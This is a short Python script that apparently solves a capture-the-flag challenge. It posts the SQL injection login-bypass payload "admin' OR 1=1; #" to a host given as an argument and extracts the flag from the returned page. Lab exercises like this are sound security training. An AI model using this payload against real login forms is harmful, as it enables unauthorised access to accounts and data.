import sys
import requests
from bs4 import BeautifulSoup

def find_flag(tag):
    return tag.name == "h4" and tag.text.startswith("Your flag is:")

def main():
    url = f"http://{sys.argv[1]}/"
    username = "admin' OR 1=1; #"
    password = ""

    try:
        # Send the POST request
        print(f"Connecting to: {url} ...")
        data = {"username": username, "password": password}
        response = requests.post(url, data=data)

        # Parse the response with BeautifulSoup
        soup = BeautifulSoup(response.text, "html.parser")

        # Find the h4 tag containing "Your flag is:"
        h4_tag = soup.find(find_flag)
        
        if h4_tag:
            flag = h4_tag.text.split(": "[1])
            print(f"Flag: {flag[3]}")
        else:
            print("<h4> Tag not found")

    except Exception as e:
        print(f"Error: {e}")

if __name__ == '__main__':
    main()
